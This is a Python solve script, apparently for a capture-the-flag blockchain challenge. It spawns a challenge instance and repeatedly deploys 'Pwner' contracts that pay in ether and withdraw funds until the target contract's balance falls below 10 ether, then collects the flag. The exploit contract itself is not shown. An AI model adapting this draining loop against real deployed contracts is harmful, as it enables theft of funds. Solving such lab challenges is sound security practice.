
from web3 import Web3
import time
from blockchain import compile_contract, construct_contract, ETHER
from platypwn_helper import spawn_instance, get_flag, kill_instance

spawner = ("10.80.11.184", 31337)
spawner = ("10.80.3.197", 31337)

setup_abi, setup_bytecode = compile_contract("contracts/Setup.sol")
chal_abi, chal_bytecode = compile_contract("contracts/Chal.sol")
pwner_abi, pwner_bytecode = compile_contract("contracts/Pwner.sol")

d = spawn_instance(spawner)

rpc = d["RPC"]

privateKey = d["PrivateKey"]
address = d["Address"]
setupAddress = d["setupAddress"]

w3 = Web3(Web3.HTTPProvider(rpc))
acct = w3.eth.account.from_key(privateKey)
w3.eth.default_account = acct.address
address = acct.address


setup_instance = w3.eth.contract(address=setupAddress, abi=setup_abi, bytecode=setup_bytecode)
targetAddress = setup_instance.functions.TARGET().call()

chal_instance = w3.eth.contract(address=targetAddress, abi=chal_abi, bytecode=chal_bytecode)
pwner_blueprint = w3.eth.contract(abi=pwner_abi, bytecode=pwner_bytecode)


while True:
    balance = chal_instance.functions.getBalance().call()
    our_balance = w3.eth.get_balance(acct.address)
    print(f'Balance: {(balance // (10**15)) / 1000:.2f}, Ours: {our_balance // (10**15) / 1000:.2f}')
    if balance < 10 * ETHER:
        break

    pwners = []

    numpwners = (our_balance // ETHER - 1) // 3
    for i in range(numpwners):
        pwner = construct_contract(w3, pwner_blueprint, [targetAddress])

        pwner.functions.doPwn(3).transact({
            "value" : 3*ETHER,
        })
        pwners.append(pwner)

    time.sleep(1.5);
    for pwner in pwners:
        if w3.eth.get_balance(pwner.address):
            pwner.functions.retrieve.transact();

print(get_flag(spawner))
kill_instance(spawner)
